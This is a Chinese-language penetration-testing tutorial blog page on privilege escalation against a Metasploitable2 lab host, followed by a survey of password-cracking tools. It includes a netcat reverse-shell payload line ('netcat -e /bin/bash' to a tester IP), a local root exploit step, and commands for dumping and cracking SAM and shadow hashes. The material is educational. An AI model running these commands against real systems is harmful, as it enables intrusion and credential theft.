@@ -1,0 +1,739 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.2.3">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="https://www.ljjyy.com">
+    <!--SEO-->
+
+    <meta name="keywords" content="linux,kali">
+
+
+    <meta name="description" content="获取目标系统的控制权是渗透成功的标志。审计人员也可以使用适用于目标系统的本地漏洞来提升自己的权限，只要他们能够在目标系统上运行提权漏洞利用程序，就可以获得主机上的超级用户权限或者系统级权限。审计...">
+
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+
+    <!--Title-->
+
+
+<title>Kali linux渗透测试之 六.权限提升 | 来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</title>
+
+
+    <link rel="alternate" href="/atom.xml" title="来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟" type="application/atom+xml">
+
+
+    <link rel="icon" href="/favicon.ico">
+
+    
+
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.5.0">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash">
+
+
+
+
+    
+	<div class="hide">
+        <script charset="UTF-8" id="LA_COLLECT" src="//sdk.51.la/js-sdk-pro.min.js"></script>
+        <script>LA.init({id: "JgbNOaw1xxsmUUsQ",ck: "JgbNOaw1xxsmUUsQ"})</script>
+	</div>
+
+
+
+
+
+
+    
+    <meta name="baidu-site-verification" content="dTHILoORpx">
+
+
+    <script>
+        (function(){
+            var bp = document.createElement('script');
+            var curProtocol = window.location.protocol.split(':')[0];
+            if (curProtocol === 'https') {
+                bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+            }
+            else {
+                bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+            }
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(bp, s);
+        })();
+    </script>
+
+</head>
+
+</html>
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+
+<body>
+    <header class="main-header"  >
+    <div class="main-header-box">
+        <!--a class="header-avatar" href="/" title='Ljjyy.com'>
+            <img src="/img/avatar.jpg" alt="logo头像" class="img-responsive center-block">
+        </a-->
+        <div class="branding">
+            
+                <h2> 多读书多实践，勤思考善领悟 </h2>
+            
+    	  </div>
+    </div>
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                    <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="web-logo"  href="/" title='Ljjyy.com'></a>
+                    <!--a class="navbar-brand" href="https://www.ljjyy.com">来唧唧歪歪(Ljjyy.com) - 多读书多实践，勤思考善领悟</a-->
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu" style="">
+                    <ul class="menu">
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/"><i class="fa "></i>首页</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/cloud/"><i class="fa "></i>云计算</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/front/"><i class="fa "></i>前端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/back/"><i class="fa "></i>后端</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/devops/"><i class="fa "></i>运维</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/crack/"><i class="fa "></i>破解</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/penetration/"><i class="fa "></i>渗透</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/tool/"><i class="fa "></i>工具</a>
+                            </li>
+                        
+                            <li role="presentation" class="text-center">
+                                <a href="/categories/other/"><i class="fa "></i>其他</a>
+                            </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="Kali linux渗透测试之 六.权限提升">
+            
+	            Kali linux渗透测试之 六.权限提升
+            
+        </h1>
+        <div class="post-meta">
+    
+        <span class="categories-meta fa-wrap">
+            <i class="fa fa-folder-open-o"></i>
+            <a class="category-link" href="/categories/penetration/">渗透</a>
+        </span>
+    
+
+    
+        <span class="fa-wrap">
+            <i class="fa fa-tags"></i>
+            <span class="tags-meta">
+                
+                    <a class="tag-link" href="/tags/kali/">kali</a> <a class="tag-link" href="/tags/linux/">linux</a>
+                
+            </span>
+        </span>
+    
+
+    
+        
+        <span class="fa-wrap">
+            <i class="fa fa-clock-o"></i>
+            <span class="date-meta">2019/01/11</span>
+        </span>
+        
+    
+</div>
+            
+            
+            <p class="fa fa-exclamation-triangle warning">
+                本文于<strong>1547</strong>天之前发表，文中内容可能已经过时。
+            </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <p>获取目标系统的控制权是渗透成功的标志。审计人员也可以使用适用于目标系统的本地漏洞来提升自己的权限，只要他们能够在目标系统上运行提权漏洞利用程序，就可以获得主机上的超级用户权限或者系统级权限。审计人员还可以以该主机为跳板进一步攻击局域网络。（审计人员可能以各种方式获得与被控制系统有关的更多信息，具体地说，他们可能使用嗅探手段截获网络数据包，破解各种服务的密码，在局域网中使用网络欺骗手段，所以说提升权限的最终目的是获得目标系统的最高访问权限）</p>
+<p>利用漏洞的最终目的是获取被测 系统的最高权限，即Windows操作系统中管理员账户的权限，或UNIX操作系统中root账户的 权限。所以在利用漏洞之后就应当提升权限。提升权限的实质是通过利用漏洞的手段提高自身的操 作权限。</p>
+<h1 id="一-权限提升的方式"><a href="#一-权限提升的方式" class="headerlink" title="一. 权限提升的方式"></a>一. 权限提升的方式</h1><p>提升权限的方式分为两类。</p>
+<ol>
+<li><p>纵向提权（vertical  privilege escalation）<br>如果低权限角色（的用户）能够获得高权限角色 的权限，则这种提权就可称为纵向提权。例如，如果在提权之后，内容管理系统（CMS）的 某个用户能够使用管理员的功能，那么这种提权就是纵向提权。</p>
+</li>
+<li><p>横向提权（horizontal   privilege escalation）<br>如果获取了同级别角色的权限，这种提权就 属于横向提权。例如，如果在网上银行里，用户  A   获取了用户 B   的权限，他可以替用户B进 行操作，那么这种提权就属于横向提权。</p>
+</li>
+</ol>
+<p>越权提升权限的攻击矢量，大体可分为以下几种。</p>
+<ul>
+<li><p>利用本地漏洞。</p>
+</li>
+<li><p>利用目标系统上的配置缺陷。例如，如果     home 目录可被其他用户访问，那么攻击人员可就 可以使用目录里的SSH私有密钥访问其他主机。</p>
+</li>
+<li><p>利用目标系统的弱密码。</p>
+</li>
+<li><p>嗅探网络流量以捕获他人的用户名和密码。</p>
+</li>
+<li><p>伪造网络数据包。</p>
+</li>
+</ul>
+<h1 id="二-利用本地漏洞"><a href="#二-利用本地漏洞" class="headerlink" title="二. 利用本地漏洞"></a>二. 利用本地漏洞</h1><p>当我们确定目标之后，我们可以使用Nmap对目标进行一个端口扫描来查看开启了哪些服务，之后我们可以查看这些服务是否存在相应的漏洞，如果有，我们使用相应的漏洞来进行漏洞利用即可，之后再提权就好。</p>
+<ul>
+<li><p>使用本地漏洞的利用程序（local exploit）来提升权限</p>
+</li>
+<li><p>Kali测试机IP：192.168.198.130</p>
+</li>
+<li><p>Metasploitable2： 192.168.198.129</p>
+</li>
+</ul>
+<ol>
+<li>在kali上扫描脆弱系统的所有端口，查看其服务 </li>
+</ol>
+<p><img src="/img/posts/20190512085621611.png" alt="img"></p>
+<ol start="2">
+<li>在msfconsole上搜索是否有对应的exploit程序（搜索结果表明有）</li>
+</ol>
+<p><img src="/img/posts/20190512085632502.png" alt="img"></p>
+<ol start="3">
+<li>通过exploit利用了该服务的漏洞，而后通过操作系统的指令看到获取的权限是daemon，再进一步操作之前，我们应获取到被测主机的详细信息，首先查看其内核版本<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#uname</span> -r</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>通过上述指令，我们了解到目标主机的内核是2.6.24-16-server</p>
+<p>我们搜索  exploit-db     的资料库，发现某个 exploit     程序 （<a href="http://www.exploitdb.com/exploits/8572/）" target="_blank" rel="noopener">http://www.exploitdb.com/exploits/8572/）</a>  可将我们的权限提升为root权限。下一步，在测试主机上保存exploit程序，然后使被测主机从测试主机下载这个程序（emmm，拒绝访问）</p>
+<p><img src="/img/posts/20190512085634717.png" alt="img"></p>
+<p>尝试关闭kali防火墙，打开80端口也不行</p>
+<p><img src="/img/posts/20190512085622142.png" alt="img"></p>
+<p>在被测主机上下载exploit之后，我们在被测主机上使用gcc指令编译exploit。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc   privs<span class="selector-class">.c</span> -o  privs</span><br></pre></td></tr></table></figure></p>
+<p>现在，我们制备好了exploit程序。在分析了exploit的源代码之后，我们发现这个exploit程序需 要在命令行里使用     udevd    netlink     socket 的 PID（Process     Identifier）作为参数。为此，我们 使用下述指令获取这个PID值。<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">cat</span>   /proc/<span class="keyword">net</span>/netlink</span><br></pre></td></tr></table></figure></p>
+<p>您也可以通过单条指令获取udev服务的PID。<br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ps</span> aux   |    <span class="keyword">grep</span>    udev</span><br></pre></td></tr></table></figure></p>
+<p>上述指令的输出结果如下。<br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="number"> 2391 </span> 0.0 0.1<span class="number"> 2216 </span><span class="number"> 660 </span>    ?    S    &lt;S  21:06 0:01    /              sbin  /udevd     -daemon</span><br></pre></td></tr></table></figure></p>
+<p>即，udev服务的PID是2390。</p>
+<p>在实际的渗透测试工作之中，您可能要安装一台内核与被测主机完全相同的测试主机，以测 试exploit程序。</p>
+<p>从被测主机上收集的信息判断，目标主机上安装有NetCat程序。成功运行exploit程序之后， 我们就有了被测主机的 root  权限。我们再在被测主机上运行  netcat 程序，让它反向连接到测 试主机。通过其源代码可知，这个              exploit   把文件名为 run      的可执行文件当作其payload。所 以，我们需要制备这个payload。<br><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo      <span class="string">'#!/bin/bash'</span> &gt;    <span class="keyword">run</span><span class="bash"> <span class="built_in">echo</span>  <span class="string">'/bin/netcat  -e              /bin/bash    192.168.56.101 31337'</span>     &gt;&gt;  run</span></span><br></pre></td></tr></table></figure></p>
+<p>在执行payload之前，我们还要在测试主机上启动netcat的监听服务，以受理被测主机发起的 连接。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vv    -l    -<span class="selector-tag">p</span>  <span class="number">31337</span></span><br></pre></td></tr></table></figure></p>
+<p>最后，我们在被测主机上运行下述指令。<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pri<span class="attr">vs   2390</span></span><br></pre></td></tr></table></figure></p>
+<p>通过whoami指令，我们可看到已经成功提升自身权限为root的权限。</p>
+<h1 id="三-密码攻击"><a href="#三-密码攻击" class="headerlink" title="三. 密码攻击"></a>三. 密码攻击</h1><p>密码是当代系统验证用户身份的主要手段。只要某人能够递交正确的用户名和对应的密码， 系统就允许这个人登录并允许他使用该账号的所有资源。</p>
+<p>构成身份验证的要素可分为三大类。</p>
+<ul>
+<li><p>基于所知（something you know）。这类认证要素通常被称为身份验证的第一要素。密码 就属于这类要素。理论上来说，只有特定秘密的持有人才能“知道”有关秘密。然而不幸的是， 这类信息很容易外泄，也易于被他人获悉。因此，机要系统应当采取其他方式的身份验证方 式。</p>
+</li>
+<li><p>基于所有（somethingyou   have）。这类认证要素通常被称为身份验证的第二要素。安全令 牌、门禁卡等都属于这类认证要素。向系统出示相应的安全持有物后，持有者即可获得登录 权。不过，持有物（信息）可被复制，所以这种身份验证方法并非没有缺陷。</p>
+</li>
+<li><p>基于特征（something you  are）。这类认证要素通常被称为身份验证的第三要素。相比前 两者而言，这类信息的身份验证方法更为安全。然而，已经出现了攻击这种验证方法的实际 案例。指纹识别和视网膜识别都属于验证这类要素的手段。</p>
+</li>
+</ul>
+<p>如果有较高的安全需求，就应当验证一个以上的验证要素。高规格的安全系统往往验证第一 要素和第二要素。因为这种方法验证了两种身份验证要素，因此被称为双要素验证。</p>
+<p>然而不幸的是，经验表明，目前多数系统广泛依赖单一的密码验证。作为渗透测试人员，您应当在测试过程中验证密码的安全性。</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>根据攻击方式的不同，密码攻击可分为以下几类。</p>
+<ol>
+<li>离线攻击：这种攻击手段意在获取目标主机上的密码      hash   文件，并将该文件复制到攻击人 员的主机。此后，攻击人员就可使用密码破解工具破解密码文件。这种方法的优点是无须顾 及被测主机上的密码阻止策略（账户锁定等设置），因为有关破解工作是在攻击人员的主机上完成的                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    - 在线攻击：如果采用这种方法，攻击人员将猜测用户名和对应的密码。因为需要多次猜测用 户密码，所以这种方式因为可能会触发账户锁定等保护机制。</li>
+<li>在线攻击：所谓在线破解，意味着这类工具在与被测主机建立连接之后才能破解密码。</li>
+</ol>
+<h2 id="离线攻击工具"><a href="#离线攻击工具" class="headerlink" title="离线攻击工具"></a>离线攻击工具</h2><p>这类工具用于实施离线密码攻击。通常情况下，你会用这种工具破解高权限账户的密码，所以这些工具往往用于纵向提权</p>
+<p>既然已经有了某种权限的账户信息，为什么还需要其他账户的登录信息呢？在对某个系统进 行渗透测试时，受被测主机配置的影响，所用账户可能无法运行某些特定的应用程序。这种 情况下，您就无法进行下一步测试。但是，如果使用常规用户身份登录，您就可以正常运行 那些程序了。这是需要获取其他账户信息的原因之一。</p>
+<p>在利用SQL注入漏洞之后，测试人员就可导出整个数据库，继而可找到密码的哈希值。离线破解工具可以帮助测试人员从哈希值中获取记录的原始信息。</p>
+<ol>
+<li>hash-identifier</li>
+</ol>
+<p>这款工具可识别哈希的类型。只有知道被测系统采用了什么哈希算法，才能使用密码破解工 具破解哈希值。有关hash-identifier程序能够支持的加密算法，请参见作者的官方网站： <a href="http://code.google.com/p/hash-identifier/" target="_blank" rel="noopener">http://code.google.com/p/hash-identifier/</a>。</p>
+<p>在物理机上利用工具对明文进行加密：123456789</p>
+<p><img src="/img/posts/20190512085626628.png" alt="img"></p>
+<p>将经过SHA1加密的密文用hash-identifier来验证</p>
+<p><img src="/img/posts/20190512085637588.png" alt="img"></p>
+<p>在使用md5加密来验证</p>
+<p><img src="/img/posts/20190512085628490.png" alt="img"></p>
+<p><img src="/img/posts/20190512085631242.png" alt="img"></p>
+<p>（验证结果显示还是挺准确的）</p>
+<p>接下来，我们可以使用Hashcat程序破解这个哈希值中的信息。</p>
+<ol start="2">
+<li>Hashcat</li>
+</ol>
+<p>Hashcat是一款免费的多线程密码破解工具。目前，它可破解80种算法（<a href="http://hashcat" target="_blank" rel="noopener">http://hashcat</a>. net/hashcat/#features-algos）的哈希值。Hashcat    程序完全依赖 CPU    运算，它要比利用 GPU（Graphical     Processing Unit）运算的密码破解程序要慢一些。</p>
+<p>Hastcat支持6种攻击模式。</p>
+<ul>
+<li><p>1)Straight：程序会从文本文件里逐行读取数据，并把这些数据当作密码的备选值。这是默认 的攻击模式，通常也被称作字典式攻击模式。</p>
+</li>
+<li><p>2)Combination（组合模式）：Hashcat     将会把字典中的单词进行排列组合，再做哈希碰撞。 例如，如果字典中含有以下单词</p>
+<p>password ○ 01</p>
+</li>
+</ul>
+<p>那么Hashcat将会尝试的密码将是：</p>
+<pre><code>passwordpassword
+
+password01
+
+01password ○ 0101
+</code></pre><ul>
+<li><p>3)Toggle Case（穷举大小写组合）：程序将会尝试每个字典单词的各种大小写组合。</p>
+</li>
+<li><p>4)Brute   force（暴力破解）：程序将会从关键字空间中取样再做排列组合。这种攻击模式正在 被    mask   attack 所取代。例如，如果我们设定程序测试 A-Z   组成的双字符密码，那么Hashcat 将会尝试AA到ZZ的所有英文字符组合。</p>
+</li>
+<li><p>5)Permutation（排列组合）：对于字典里每个备选密码，程序将会按照字符进行各种排列组 合。例如，如果字典里有AB这个备选密码，那么Hashcat将会测试的密码如下：</p>
+<p>AB ○ BA</p>
+</li>
+<li><p>6)Table-lookup（表查询）：程序将把字典里每个备选密码的每个字符都当作对应的mask进行 处理。这是一种自动匹配模式的穷举攻击，详细情况请参见<a href="http://hashcat" target="_blank" rel="noopener">http://hashcat</a>.  net/wiki/doku.php? id=table_lookup_attack。</p>
+</li>
+</ul>
+<p>Hashcat需要相应的字典文件。您可从下述链接中下载适用的字典。</p>
+<ul>
+<li><p><a href="http://www.skullsecurity.org/wiki/index.php/Passwords" target="_blank" rel="noopener">http://www.skullsecurity.org/wiki/index.php/Passwords</a></p>
+</li>
+<li><p><a href="http://cyberwarzone.com/cyberwarfare/password-cracking-megacollection-passwordcracking-word-lists" target="_blank" rel="noopener">http://cyberwarzone.com/cyberwarfare/password-cracking-megacollection-passwordcracking-word-lists</a></p>
+</li>
+<li><p><a href="http://hashcrack.blogspot.de/p/wordlist-downloads_29.html" target="_blank" rel="noopener">http://hashcrack.blogspot.de/p/wordlist-downloads_29.html</a></p>
+</li>
+<li><p><a href="http://packetstormsecurity.com/Crackers/wordlists/" target="_blank" rel="noopener">http://packetstormsecurity.com/Crackers/wordlists/</a></p>
+</li>
+<li><p><a href="http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists.html" target="_blank" rel="noopener">http://blog.g0tmi1k.com/2011/06/dictionaries-wordlists.html</a></p>
+</li>
+<li><p><a href="http://www.md5decrypter.co.uk/downloads.aspx" target="_blank" rel="noopener">http://www.md5decrypter.co.uk/downloads.aspx</a></p>
+</li>
+</ul>
+<p>现在开始演示Hashcat的适用方法。 如果在执行Hashcat的时候指定–help选项，您将看到Hashcat的帮助信息。我们可通过这些帮 助信息查看各个选项的使用方法。</p>
+<p>假设我们获取了文件名为test.hash的密码文件，并从中找到了下述哈希值。</p>
+<p>5f4dcc3b5aa765d61d8327deb882cf99</p>
+<p>我们可使用rockyou.txt文件作为Hashcat的密码字典。简便起见，我们可把密码文件和字典文 件放在同一个目录下。用pwd指令查看当前目录的目录名。</p>
+<p>然后我们通过下述指令，令Hashcat以默认的攻击方式测试密码。</p>
+<p>   将有sha1加密的123456789密文放在password.hash下，用垃圾字典dictionary.txt破解</p>
+<p><img src="/img/posts/20190512085625487.png" alt="img"></p>
+<p>#hashcat –force -m 100   password.hash dictionary.txt</p>
+<p><img src="/img/posts/20190512085631238.png" alt="img"></p>
+<p>  <img src="/img/posts/20190512085632270.png" alt="img"></p>
+<p>默认攻击模式的破解速度比较快。如果密码字典没有命中正确的密码，您就需要尝试其他的 攻击模式。</p>
+<p>Hashcat系列有很多密码破解工具。其中部分程序可以使用GPU破解密码；所以只要您的电脑 装有兼容的GPU，那么破解速度还是相当理想的。请注意，无法在VM虚拟机里使用基于GPU 破解的程序，因为在虚拟机里运行的程序无法直接调用物理主机的硬件。此外，显卡的兼容 性也很重要。要使用基于GPU运算的破解程序，您的显卡需要支持CUDA（NVidia）或 OpenCL（AMD）技术。在Hashcat系列里，支持基于GPU运算的破解程序有下面几下。</p>
+<ul>
+<li><p>oclhashcat-lite：它是一款基于GPU 运算的密码破解程序。在Hashcat 系列工具里，它算得 上是速度最快的破解工具。不过它支持的哈希算法有限（约30种），而且只支持markov、 brute    force 和mask  模式的密码攻击。</p>
+</li>
+<li><p>oclhashcat-plus：它是一款基于   GPU    运算的密码破解程序，支持多数哈希算法。这个程序 针对字典式攻击进行了各种优化，可同时破解多个哈希值。oclhashcat-plus 工具支持的攻击 模式有brute    foce（以mask  attack 模式实现）、combinator  attack、dictionary attack、hybrid attack、mask attack和基于规则的攻击。</p>
+</li>
+</ul>
+<p>如需详细了解密码字典的有关情况，请参见：</p>
+<ul>
+<li><p>Hybrid    attack（<a href="https://hashcat.net/wiki/doku.php?id=hybrid_attack）" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php?id=hybrid_attack）</a></p>
+</li>
+<li><p>Mask attack（<a href="http://hashcat.net/wiki/doku.php?id=mask_attack）" target="_blank" rel="noopener">http://hashcat.net/wiki/doku.php?id=mask_attack）</a></p>
+</li>
+<li><p>Rule-basedattack（<a href="http://hashcat.net/wiki/doku.php?id=rule_based_attack）" target="_blank" rel="noopener">http://hashcat.net/wiki/doku.php?id=rule_based_attack）</a></p>
+</li>
+</ul>
+<ol start="3">
+<li>RainbowCrack</li>
+</ol>
+<p>彩虹表破解（RainbowCrack）是利用彩虹表来破解哈希数据的工具。它实现了由Philippe Oechslin提倡的“以空间换时间”的技术思想。这种破解密码的方式有别于暴力破解。暴力破解攻击首先计算密码的备选值（字典里的密 码）的哈希值，然后再将计算出来的哈希值与获取到的哈希值进行对比。如果这两个值相 等，则可确定哈希值的原始内容即是密码；否则就说明密码不正确。</p>
+<p>彩虹表破解法的效率也高于暴力破解法。这是因为暴力破解法必须计算字典内容的哈希值， 然后进行匹配。而使用“以空间换时间”技术的彩虹表破解法，事先就计算好了字典各项的哈希 值，破解过程只是简单的数值比较，所以效率更高。</p>
+<p>Kali Linux收录了RainbowCrack的三大工具。在破解哈希时，您必须依次使用这些工具。</p>
+<p>​    -  rtgen：生成彩虹表的程序。生成彩虹表的计算过程也被称为彩虹表的预计算阶段。彩虹表 包含字典、哈希值、哈希算法、字符集以及字典的长度范围。彩虹表的预计算相当费时。但 是生成彩虹表之后，彩虹表破解法将比暴力破解法的效率要高上不少。rtgen    程序支持的算法 有   LanMan、NTLM、MD2、MD4、MD5、SHA1   以及RIPEMD160。</p>
+<p>​    -  rtsort：对rtgen   生成的彩虹表进行排序的工具。</p>
+<p>​    -  rcrack：利用彩虹表査找哈希值的工具。</p>
+<ol start="4">
+<li>samdump2</li>
+</ol>
+<p><code># samdmp2</code></p>
+<p>假设已经取得system   和sam文 件，将它们以同文件名保存在home目录下，那么破解哈希值的命令如下所示。<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#samdump2     <span class="keyword">system</span>     sam    -o     test-sam</span><br></pre></td></tr></table></figure></p>
+<p>通过上述指令，我们把samdump2的输出结果保存为文件test-sam ，接下来就可以用密码破解工具破解test-sam文件的哈希值，可以选用下文介绍的John和 Ophcrack。</p>
+<ol start="5">
+<li>John</li>
+</ol>
+<p>John the Ripper/John（<a href="http://www.openwall.com/john/）" target="_blank" rel="noopener">http://www.openwall.com/john/）</a>  是一款破解密码哈希的工具。目前， 这款工具可以破解40多种类型的密码哈希。它可破解常见的  DES、MD5、LM、NT、crypt、 NETLM和NETNTLM型哈希。虽然破解哈希的软件有很多，但是DES和crypt型哈希的破解功能使John成为一枝独秀。</p>
+<p>如需启动John程序，可在终端中使用下述指令。</p>
+<p><code>#john</code></p>
+<p>John的密码破解模式分为以下4种。</p>
+<ul>
+<li><p>1)字典模式（Wordlist mode）：在这种模式下，用户只需要提供字典文件（wordlist）就可以 破解密码文件。字典文件是包含密码备选值的文本文件，文件中的每行内容都将被当作一个 用来进行碰撞测试的候选密码。这种模式具备“字词变化”（就是某种规则）的功能，（这种规 则）可自动套用在每行的备选密码中，以提高破解的概率。–wordlist=选项用于指定字典文 件。这种字典可以是您自己制作的字典，也可以是他人制作的字典。许多网站都提供字典下 载。例如，   Openwall              Project（John  的官方网站）就提供字典下载服务，详情请参见 <a href="http://download" target="_blank" rel="noopener">http://download</a>.      openwall.net/pub/wordlists/。</p>
+</li>
+<li><p>2)简易破解模式（Single   crack  mode）：这是John程序作者推荐的应当首先尝试的破解模 式。在这种模式下，John会使用登录名、全名和用户的home文件夹名作为测试的候选密码， 并使用候选密码来碰撞（破解）相应账户的密码，或者破解使用相同salt加密的密码哈希。就 结果而言，这种模式比字典模式要快得多。  </p>
+</li>
+<li><p>3)增强型破解模式（Incremental     mode）：这种模式是John     各种模式里功能最强大的破解模 式，它会尝试所有可能的密码组合。不过，如果用户不设置密码的测试区间，程序将会非常 耗时。测试区间由密码长度的上限和字符集的设置构成。要这种破解模式破解密码，必须指 定相应的破解模块。程序预设的模块有All、Alnum（字母和数字）、Alpha（字母）、 Digits（数字）和  Lanman；您也可以根据实际需要自定义一个测试模块。</p>
+</li>
+<li><p>4)外部模式（External  mode）：在这种模式下，用户可以指定John程序使用外部（源）程序 破解密码。如需使用这种模式，您首先应在配置文件里创建一个[List.External:MODE]的节点 （section）。其中，MODE就是这种模式的一个（任意）名字，而这个节点的内容应当是C语 言编写的生成候选密码的各种函数。以这种模式启动程序之后，John会编译这个节点内的源代码，并使用它进行密码破解。</p>
+</li>
+</ul>
+<figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># unshadow  etc-passwd  etc-shadow  &gt; pass</span></span><br></pre></td></tr></table></figure>
+<p>可使用下述指令破解密码；其中，pass就是需要破解的密码文件，也就是刚刚合并处理的那 个文件。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#john</span>  pass</span><br></pre></td></tr></table></figure></p>
+<p>如果John程序能够破解这些密码，它就会把破解的密码储存为john.pot。</p>
+<p>如需查看破解出来的密码，可使用下述指令。<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-id">#john</span> --show  pass</span><br></pre></td></tr></table></figure></p>
+<p>要破解Windows密码，就要使用pwdump（工具集）把SYSTEM和SAM文件中的密码哈希值 （LM和/或NTLM算法）提取出来。如需了解这个工具集的各款工具，请参见<a href="http://www" target="_blank" rel="noopener">http://www</a>. openwall.com/passwords/pwdump  。Kali Linux收录了其中的samdump2程序。</p>
+<p>接下来，我们使用字典文件     password.lst 破解   samdump2              导出的哈希信息。此时需要使用的 指令如下所示。<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">john   <span class="built_in">test</span>-sam     --wordlist=password.lst  -     -format=nt</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> john <span class="built_in">test</span>-sam     --format=nt --show</span></span><br></pre></td></tr></table></figure></p>
+<ol start="6">
+<li>Ophcrack</li>
+</ol>
+<p>Ophcrack是一款基于彩虹表的破解工具。它可破解LM和NTLM型的Windows的密码哈希。这 款程序有命令行版本，也有图形化界面的版本。因为它属于彩虹表破解工具，所以Ophcrack 采用的破解策略同样是以空间换时间的策略。</p>
+<p>Windows   NT 和早期的     Windows 系统（包括 2000/XP）采用 LAN     Manager（LM）保存用户密码的哈希。</p>
+<p>后来，微软推出了NT  LAN    Manager（NTLM）哈希，以替代LM哈希。NTLM    算法可对账号进 行认证，并实现了会话的完整性和保密性。Windows    NT SP4开始，Windows系统开始逐步采 纳更为安全的NTLM  v2的算法。这种新算法增强了服务器和用户之间的认证功能。微软已经 不再推荐用户使用NTLM哈希。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#ophcrack-cli</span></span><br></pre></td></tr></table></figure></p>
